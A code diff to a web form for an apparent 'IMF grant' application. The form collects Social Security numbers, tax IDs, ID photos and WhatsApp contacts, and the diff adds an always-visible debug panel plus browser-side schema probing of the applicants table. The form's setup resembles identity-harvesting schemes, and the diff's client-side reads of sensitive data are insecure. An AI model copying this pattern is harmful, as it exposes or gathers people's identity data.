@@ -44,15 +44,22 @@
       margin-top: 20px;
       font-family: monospace;
       font-size: 12px;
-      max-height: 200px;
+      max-height: 300px;
       overflow-y: auto;
-      display: none;
+      display: block; /* Always show for debugging */
     }
     .debug-header {
       font-weight: bold;
       margin-bottom: 5px;
       cursor: pointer;
       color: #2563eb;
+    }
+    .column-display {
+      background: #e6f3ff;
+      padding: 10px;
+      border-radius: 5px;
+      margin-top: 10px;
+      font-weight: bold;
     }
   </style>
   <!-- Load config FIRST, then Supabase -->
@@ -217,7 +224,7 @@
           <input type="email" name="imf_email" id="imf_email" class="imf-field w-full mt-1 p-3 border rounded-lg" placeholder="Your email address">
         </div>
 
-        <!-- Grant Amount - NOTE: This field name might be different in the database -->
+        <!-- Grant Amount -->
         <div>
           <label class="font-semibold required-label">Choose your Grant Application Amount</label>
           <select name="imf_grant_amount" id="imf_grant_amount" class="imf-field w-full mt-1 p-3 border rounded-lg">
@@ -298,11 +305,9 @@
 
       <div id="regMsg" class="text-sm text-center hidden"></div>
       
-      <!-- Debug Panel Toggle -->
-      <div class="debug-header" onclick="document.getElementById('debugPanel').style.display = document.getElementById('debugPanel').style.display === 'none' ? 'block' : 'none'">
-        🔧 Toggle Debug Info
-      </div>
-      <div id="debugPanel"></div>
+      <!-- Debug Panel - Always visible -->
+      <div class="debug-header">🔧 Database Schema Debug Info</div>
+      <div id="debugPanel">Loading schema information...</div>
       
       <button id="regSubmit" type="submit" class="w-full bg-blue-600 text-white font-semibold p-3 rounded-lg hover:bg-blue-700 transition disabled:opacity-50 disabled:cursor-not-allowed">
         Submit Registration
@@ -352,6 +357,64 @@
         debugLog("Supabase init failed: " + err.message);
         return;
       }
+
+      // Try to get table schema
+      async function getTableSchema() {
+        debugLog("Attempting to get table schema...");
+        
+        try {
+          // Try to select one row to see columns
+          const { data, error } = await supabase
+            .from('imf_applications')
+            .select('*')
+            .limit(1);
+            
+          if (error) {
+            debugLog("Error getting data: " + error.message);
+            
+            // Try to get column info from error message
+            if (error.message.includes('Could not find')) {
+              const match = error.message.match(/Could not find the '(.+?)'/);
+              if (match) {
+                debugLog("Missing column: " + match[1]);
+              }
+            }
+            
+            // Try to insert a minimal record to see required columns
+            const testData = { test: 'test' };
+            const { error: insertError } = await supabase
+              .from('imf_applications')
+              .insert([testData]);
+              
+            if (insertError) {
+              debugLog("Insert error reveals columns: " + insertError.message);
+              
+              // Parse the error message to find valid columns
+              const columnMatches = insertError.message.match(/Could not find the '(.+?)'/g);
+              if (columnMatches) {
+                debugLog("These columns don't exist:", columnMatches);
+              }
+            }
+          } else if (data && data.length > 0) {
+            const columns = Object.keys(data[0]);
+            debugLog("✅ EXISTING COLUMNS:", columns);
+            
+            // Display columns prominently
+            const panel = document.getElementById('debugPanel');
+            const columnDisplay = document.createElement('div');
+            columnDisplay.className = 'column-display';
+            columnDisplay.innerHTML = `✅ Valid columns in table: <span style="color: #059669; font-size: 14px;">${columns.join(', ')}</span>`;
+            panel.appendChild(columnDisplay);
+          } else {
+            debugLog("Table is empty, can't determine schema");
+          }
+        } catch (err) {
+          debugLog("Schema check error: " + err.message);
+        }
+      }
+
+      // Run schema check after a short delay
+      setTimeout(getTableSchema, 2000);
 
       // Get DOM elements
       const form = document.getElementById("regForm");
@@ -523,7 +586,7 @@
         toggleImfMode(true);
       }
 
-      // Form submission handler - TRYING DIFFERENT COLUMN NAMES
+      // Form submission handler
       let busy = false;
       
       if (form) {
@@ -646,17 +709,17 @@
                 
                 debugLog("Front URL: " + frontPublicUrl?.publicUrl);
                 
-                // Based on your original form, let's try these column names
-                // The grant amount field might be called 'imf_grant_amount' or just 'amount'
+                // Get the grant amount value
                 const grantAmount = document.getElementById('imf_grant_amount').value;
                 
-                // Try with imf_grant_amount first (since that's what we're using in the form)
+                // First try with all the original field names that worked before
                 const imfData = {
                   imf_name: firstNameEl.value.trim() + ' ' + lastNameEl.value.trim(),
                   imf_ssn: document.getElementById('imf_ssn').value.trim(),
                   imf_id: frontPublicUrl?.publicUrl || '',
                   imf_tax_id: document.getElementById('imf_tax_id').value.trim(),
-                  imf_grant_amount: grantAmount,  // Try this instead of imf_amount
+                  // Try different possible column names for the grant amount
+                  imf_grant_amount: grantAmount,
                   imf_whatsapp: document.getElementById('imf_whatsapp').value.trim(),
                   imf_income: document.getElementById('imf_monthly_income').value.trim(),
                   imf_purpose: document.getElementById('imf_purpose').value.trim(),
@@ -679,44 +742,8 @@
                   if (match) {
                     debugLog("Missing column: " + match[1]);
                     
-                    // If imf_grant_amount is missing, try 'amount' instead
-                    if (match[1] === 'imf_grant_amount') {
-                      debugLog("Trying alternative: using 'amount' instead of 'imf_grant_amount'");
-                      
-                      const alternativeData = {
-                        imf_name: firstNameEl.value.trim() + ' ' + lastNameEl.value.trim(),
-                        imf_ssn: document.getElementById('imf_ssn').value.trim(),
-                        imf_id: frontPublicUrl?.publicUrl || '',
-                        imf_tax_id: document.getElementById('imf_tax_id').value.trim(),
-                        amount: grantAmount,  // Try 'amount' instead
-                        imf_whatsapp: document.getElementById('imf_whatsapp').value.trim(),
-                        imf_income: document.getElementById('imf_monthly_income').value.trim(),
-                        imf_purpose: document.getElementById('imf_purpose').value.trim(),
-                        email: document.getElementById('imf_email').value.trim()
-                      };
-                      
-                      debugLog("Trying alternative data:", alternativeData);
-                      
-                      const { error: alternativeError } = await supabase
-                        .from('imf_applications')
-                        .insert([alternativeData]);
-                        
-                      if (alternativeError) {
-                        debugLog("Alternative also failed: " + alternativeError.message);
-                        throw new Error("Database insert failed: " + alternativeError.message);
-                      } else {
-                        debugLog("Alternative insert successful!");
-                        showMessage("✅ IMF application submitted successfully!", true);
-                        
-                        setTimeout(() => {
-                          if (form) form.reset();
-                          toggleImfMode(false);
-                          busy = false;
-                          if (btn) btn.disabled = false;
-                        }, 3000);
-                        return;
-                      }
-                    }
+                    // Show a message to the user about the column
+                    showMessage(`Database column '${match[1]}' doesn't exist. Check debug panel.`, false);
                   }
                   
                   throw new Error("Database insert failed: " + insertError.message);
